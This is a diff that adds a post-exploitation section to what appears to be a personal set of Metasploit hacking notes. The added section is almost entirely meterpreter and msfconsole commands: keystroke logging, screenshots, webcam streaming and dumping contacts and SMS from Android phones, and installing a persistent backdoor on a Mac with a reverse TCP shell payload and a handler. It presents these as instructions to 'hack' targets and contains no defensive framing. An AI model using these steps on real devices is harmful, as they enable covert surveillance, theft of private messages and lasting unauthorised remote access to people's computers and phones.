@@ -1734,7 +1734,73 @@ No active sessions.
 Post Exploitation Part (2)
 -------------------------
 
+Key Logging
+-----------
+"In msfconsole's meterpreter"
 
+meterpreter > keyscan_start
+meterpreter > keyscan_dump
+meterpreter > keyscan_stop
+meterpreter > screenshot
+
+Android Hacking
+---------------
+meterpreter > sysinfo
+meterpreter > help
+meterpreter > pwd
+meterpreter > webcam_list
+meterpreter > webcam_stream 2
+meterpreter > send sms -h
+
+"The following command is for contact and sms hack"
+
+meterpreter > dump_contacts
+meterpreter > dump_sms
+
+Post Exploitation for Mac Book
+-----------------------------
+"Give and install Back Door in target Mac Book ..."
+
+meterpreter > sysinfo
+meterpreter > background
+
+>> use exploit/osx/local/
+>> use exploit/osx/local/persistence
+>> show options
+>> set RUN_NOW true
+>> sessions
+>> set SESSION session_id
+>> show payloads
+>> set PAYLOAD osx/x86/shell_reverse_tcp
+>> show options
+>> set LHOST ip_address
+>> set LPORT port_number
+>> show options
+>> exploit
+
+meterpreter > background
+
+>> sessions
+>> sessions -K
+>> sessions
+
+>> use exploit/multi/handler
+>> set PAYLOAD osx/x86/shell_reverse_tcp
+>> show options
+>> set LPORT port_number
+
+"Restart target Mac Book"
+
+>> show options
+>> exploit
+
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+Post Exploitation Part (3)
+-------------------------
+
+Pivoting
+--------
 
 
 
